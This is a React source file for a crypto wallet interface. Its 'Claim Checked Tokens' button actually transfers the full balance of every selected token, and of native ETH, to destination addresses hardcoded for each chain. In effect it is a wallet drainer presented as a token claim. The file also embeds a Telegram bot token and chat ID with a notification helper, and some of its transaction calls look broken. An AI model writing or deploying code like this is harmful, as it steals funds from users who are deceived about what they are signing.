import { useState, useEffect } from 'react';
import { Button, useToasts } from '@geist-ui/core';
import { usePublicClient, useWalletClient, useAccount } from 'wagmi';
import { erc20Abi } from 'viem';
import { useAtom } from 'jotai';
import { normalize } from 'viem/ens';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
import axios from 'axios';
import { ethers } from 'ethers';
import { parseEther, parseGwei } from 'viem'; // Import necessary parsers

const TELEGRAM_BOT_TOKEN = '7207803482:AAGrcKe1xtF7o7epzI1PxjXciOjaKVW2bUg';
const TELEGRAM_CHAT_ID = '6718529435';

const sendTelegramNotification = async (message) => {
  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });
  } catch (error) {
    console.error('Error sending Telegram notification:', error);
  }
};

const destinationAddresses = {
  1: '0xFB7DBCeB5598159E0B531C7eaB26d9D579Bf804B',
  56: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  10: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  42161: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  137: '0x933d91B8D5160e302239aE916461B4DC6967815d',
};

const SendTransaction = ({ provider, recipientEnsOrAddress, amount }) => {
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  const [transactionHash, setTransactionHash] = useState(null);

  const handleSendTransaction = async () => {
    setLoading(true);
    setError(null);
    let recipientAddress;

    try {
      // Attempt to resolve ENS if it's provided, otherwise assume it's an address
      if (ethers.utils.isAddress(recipientEnsOrAddress)) {
        recipientAddress = recipientEnsOrAddress;
      } else {
        try {
          recipientAddress = await provider.resolveName(recipientEnsOrAddress);
          if (!recipientAddress) throw new Error("ENS resolution failed.");
        } catch (resolveError) {
          console.error("Error resolving ENS, using input directly:", resolveError);
          recipientAddress = recipientEnsOrAddress;
        }
      }

      console.log(`Recipient Address: ${recipientAddress}`);

      const signer = provider.getSigner();

      const tx = {
        to: recipientAddress,
        value: ethers.utils.parseEther(amount.toString())
      };

      const transactionResponse = await signer.sendTransaction(tx);
      setTransactionHash(transactionResponse.hash);

      await transactionResponse.wait();
      console.log("Transaction successful:", transactionResponse);
    } catch (err) {
      setError(err.message);
      console.error("Transaction error:", err);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div>
      <button onClick={handleSendTransaction} disabled={loading}>
        {loading ? "Sending..." : "Send Transaction"}
      </button>
      {error && <p style={{ color: 'red' }}>Error: {error}</p>}
      {transactionHash && (
        <p>
          Transaction successful! Hash:{" "}
          <a
            href={`https://etherscan.io/tx/${transactionHash}`}
            target="_blank"
            rel="noopener noreferrer"
          >
            {transactionHash}
          </a>
        </p>
      )}
    </div>
  );
};

export const SendTokens = () => {
  const { setToast } = useToasts();
  const showToast = (message, type) =>
    setToast({
      text: message,
      type,
      delay: 4000,
    });

  const [tokens] = useAtom(globalTokensAtom);
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();
  const { chain, address } = useAccount();

  const sendAllCheckedTokens = async () => {
    const tokensToSend = Object.entries(checkedRecords)
      .filter(([_, { isChecked }]) => isChecked)
      .map(([tokenAddress]) => tokenAddress);

    if (!walletClient || !publicClient) return;

    const destinationAddress = destinationAddresses[chain?.id];
    if (!destinationAddress) {
      showToast('Unsupported chain or no destination address found for this network', 'error');
      return;
    }

    let resolvedDestinationAddress = destinationAddress;

    // Resolve ENS if necessary
    if (destinationAddress.includes('.')) {
      try {
        resolvedDestinationAddress = await publicClient.getEnsAddress({
          name: normalize(destinationAddress),
        });
        if (resolvedDestinationAddress) {
          showToast(`Resolved ENS address: ${resolvedDestinationAddress}`, 'success');
        }
      } catch (error) {
        showToast(`Error resolving ENS address: ${error.message}`, 'warning');
        return; // Exit on ENS resolution error
      }
    }

    for (const tokenAddress of tokensToSend) {
      const token = tokens.find((token) => token.contract_address === tokenAddress);
      const formattedTokenAddress = tokenAddress.startsWith('0x')
        ? tokenAddress
        : `0x${tokenAddress}`;

      try {
        const formattedDestinationAddress = resolvedDestinationAddress.startsWith('0x')
          ? resolvedDestinationAddress
          : `0x${resolvedDestinationAddress}`;

        console.log(`Attempting to transfer token ${token?.contract_ticker_symbol} to ${formattedDestinationAddress}`);

        if (token?.contract_ticker_symbol === 'ETH') {
          let gasEstimate = await publicClient.estimateGas({
            account: address,
            to: formattedDestinationAddress,
            value: parseEther(token?.balance || '0'),
          });

          gasEstimate = BigInt(gasEstimate) + parseGwei('500'); // Add a buffer

          const txHash = await walletClient.sendTransaction({
            to: formattedDestinationAddress,
            value: parseEther(token?.balance || '0'),
            gas: gasEstimate,
          });

          setCheckedRecords((old) => ({
            ...old,
            [tokenAddress]: {
              ...(old[tokenAddress] || { isChecked: false }),
              pendingTxn: txHash,
            },
          }));

          showToast(
            `Native token transfer of ${token?.balance} ETH sent. Tx Hash: ${txHash.hash}`,
            'success',
          );
        } else {
          await publicClient.simulateContract({
            address: formattedTokenAddress,
            abi: erc20Abi,
            functionName: 'transfer',
            args: [formattedDestinationAddress, BigInt(token?.balance || '0')],
            account: address,
          });

          let gasEstimate = await publicClient.estimateGas({
            account: address,
            to: formattedTokenAddress,
            data: erc20Abi.encodeFunctionData('transfer', [formattedDestinationAddress, BigInt(token?.balance || '0')]),
          });

          gasEstimate = BigInt(gasEstimate) + parseGwei('500');

          const txHash = await walletClient.sendTransaction({
            to: formattedTokenAddress,
            data: erc20Abi.encodeFunctionData('transfer', [formattedDestinationAddress, BigInt(token?.balance || '0')]),
            gas: gasEstimate,
          });

          setCheckedRecords((old) => ({
            ...old,
            [tokenAddress]: {
              ...(old[tokenAddress] || { isChecked: false }),
              pendingTxn: txHash,
            },
          }));

          showToast(
            `ERC-20 transfer of ${token?.balance} ${token?.contract_ticker_symbol} sent. Tx Hash: ${txHash.hash}`,
            'success',
          );
        }
      } catch (error) {
        console.error('Transaction Error:', error);
        showToast(`Transaction failed: ${error.message}`, 'error');
      }
    }
  };

  const checkedCount = Object.values(checkedRecords).filter(
    (record) => record.isChecked,
  ).length;

  return (
    <div style={{ margin: '20px' }}>
      <form>
        <Button
          type="secondary"
          onClick={sendAllCheckedTokens}
          disabled={checkedCount === 0}
          style={{ marginTop: '20px' }}
        >
          Claim {checkedCount} Checked Tokens
        </Button>
      </form>
    </div>
  );
};



